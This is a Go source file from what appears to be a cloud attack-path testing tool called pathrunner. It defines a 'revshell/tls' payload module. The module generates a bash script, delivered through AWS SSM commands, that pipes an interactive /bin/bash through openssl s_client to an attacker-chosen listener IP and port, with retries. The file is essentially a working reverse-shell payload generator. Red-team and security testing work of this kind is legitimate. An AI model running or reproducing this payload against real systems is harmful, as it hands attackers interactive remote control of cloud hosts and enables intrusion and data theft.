// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ssm

import (
	"fmt"

	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
)

// ReverseShellTLSPayload establishes a TLS-encrypted reverse shell via an SSM command.
// Uses openssl s_client for the TLS transport with a named pipe for bidirectional I/O.
// Compatible with pathrunner's built-in listener (port 4444).
type ReverseShellTLSPayload struct{}

func init() {
	_ = payloads.Register(&ReverseShellTLSPayload{})
}

func (p *ReverseShellTLSPayload) GetName() string {
	return "revshell/tls"
}

func (p *ReverseShellTLSPayload) GetDescription() string {
	return "Establish a TLS-encrypted reverse shell via SSM command"
}

func (p *ReverseShellTLSPayload) GetTags() []string {
	return []string{
		payloads.TagServiceSSM,
		payloads.TagLanguageBash,
		payloads.TagTechniqueAccess,
		payloads.TagTransportHTTPS,
	}
}

func (p *ReverseShellTLSPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "LISTENER_IP",
			Description: "IP address of attacker's reverse shell listener",
			Required:    true,
		},
		{
			Name:        "LISTENER_PORT",
			Description: "Port for reverse shell connection",
			Required:    false,
			Default:     "4444",
		},
		{
			Name:        "RETRY_COUNT",
			Description: "Number of connection retry attempts",
			Required:    false,
			Default:     "3",
		},
		{
			Name:        "RETRY_DELAY",
			Description: "Seconds between retry attempts",
			Required:    false,
			Default:     "5",
		},
	}
}

func (p *ReverseShellTLSPayload) Validate(options map[string]string) error {
	if options["LISTENER_IP"] == "" {
		return fmt.Errorf("LISTENER_IP is required for revshell/tls payload")
	}
	return nil
}

func (p *ReverseShellTLSPayload) GenerateCode(options map[string]string) (string, error) {
	listenerIP := options["LISTENER_IP"]
	listenerPort := options["LISTENER_PORT"]
	if listenerPort == "" {
		listenerPort = "4444"
	}
	retryCount := options["RETRY_COUNT"]
	if retryCount == "" {
		retryCount = "3"
	}
	retryDelay := options["RETRY_DELAY"]
	if retryDelay == "" {
		retryDelay = "5"
	}

	script := fmt.Sprintf(`echo "Pathrunner: revshell/tls"
echo "Target: %s:%s (TLS)"

LHOST="%s"
LPORT="%s"
RETRY_COUNT=%s
RETRY_DELAY=%s

for attempt in $(seq 1 $RETRY_COUNT); do
    echo "Connection attempt $attempt/$RETRY_COUNT..."

    FIFO=$(mktemp -u /tmp/pathrunner.XXXXXX)
    mkfifo "$FIFO"

    cat "$FIFO" | /bin/bash -i 2>&1 | openssl s_client \
        -connect "$LHOST:$LPORT" \
        -quiet \
        -verify_quiet \
        -no_ign_eof \
        2>/dev/null > "$FIFO" &

    SHELL_PID=$!
    wait $SHELL_PID 2>/dev/null
    EXIT_CODE=$?

    rm -f "$FIFO"

    if [ $EXIT_CODE -eq 0 ]; then
        echo "Shell session ended normally"
        break
    fi

    echo "Connection failed or dropped (attempt $attempt/$RETRY_COUNT)"

    if [ $attempt -lt $RETRY_COUNT ]; then
        echo "Retrying in ${RETRY_DELAY}s..."
        sleep $RETRY_DELAY
    fi
done

echo "Reverse shell payload complete"
`, listenerIP, listenerPort, listenerIP, listenerPort, retryCount, retryDelay)

	return script, nil
}

func (p *ReverseShellTLSPayload) ProcessResult(result string) (string, error) {
	return result, nil
}
